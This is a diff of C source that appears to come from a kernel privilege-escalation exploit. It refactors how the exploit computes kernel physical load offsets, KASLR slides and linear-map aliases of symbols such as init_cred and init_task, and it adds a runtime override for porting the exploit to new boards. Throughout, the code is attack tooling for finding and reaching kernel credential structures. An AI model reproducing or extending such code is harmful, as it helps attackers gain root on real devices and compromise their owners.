@@ -145,9 +145,9 @@ void log_startup_context(void) {
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
-             getpid(), (unsigned long long)P0_PHYS_OFFSET,
-             (unsigned long long)P0_KERNEL_PHYS_LOAD,
-             (unsigned long long)P0_KERNEL_PHYS_DELTA,
+             getpid(), (unsigned long long)p0_phys_offset,
+             (unsigned long long)p0_kernel_phys_load,
+             (unsigned long long)(p0_kernel_phys_load - p0_phys_offset),
              (unsigned long long)SLIDE_NFULNL_LOGGER,
              (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA,
              (unsigned long long)SLIDE_INIT_TASK,
@@ -272,9 +272,8 @@ int has_zero_byte(uintptr_t value) {
  * 0xc7810000 (= _stext; _text is 0x10000 lower) -> 0xc7800000, stable across
  * boots. Override at runtime with KPHYS=0x... when porting to a new board. */
 uint64_t p0_kernel_phys_load = P0_KERNEL_PHYS_LOAD;
+uint64_t p0_phys_offset = P0_PHYS_OFFSET;
 
-/* Per-device image address of init_cred, set from the offsets table by main.c.
- * Defaults to the compile-time value so non-table builds behave as before. */
 uintptr_t g_init_cred_image = INIT_CRED;
 
 void init_p0_profile(void) {
@@ -282,19 +281,20 @@ void init_p0_profile(void) {
   if (v) {
     p0_kernel_phys_load = strtoull(v, NULL, 0);
   }
-  pr_info("p0 kernel_phys_load=%016llx delta=%016llx\n",
+  pr_info("p0 kernel_phys_load=%016llx phys_offset=%016llx delta=%016llx\n",
           (unsigned long long)p0_kernel_phys_load,
-          (unsigned long long)(p0_kernel_phys_load - P0_PHYS_OFFSET));
+          (unsigned long long)p0_phys_offset,
+          (unsigned long long)(p0_kernel_phys_load - p0_phys_offset));
 }
 
 uintptr_t p0_data_alias(uintptr_t image_addr) {
   uintptr_t off = image_addr - KIMAGE_TEXT_BASE;
   uintptr_t phys = p0_kernel_phys_load + off;
-  return ((phys - P0_PHYS_OFFSET) | P0_PAGE_OFFSET);
+  return ((phys - p0_phys_offset) | P0_PAGE_OFFSET);
 }
 
 uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
-  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - P0_PHYS_OFFSET);
+  return (data_alias - P0_PAGE_OFFSET) - (p0_kernel_phys_load - p0_phys_offset);
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
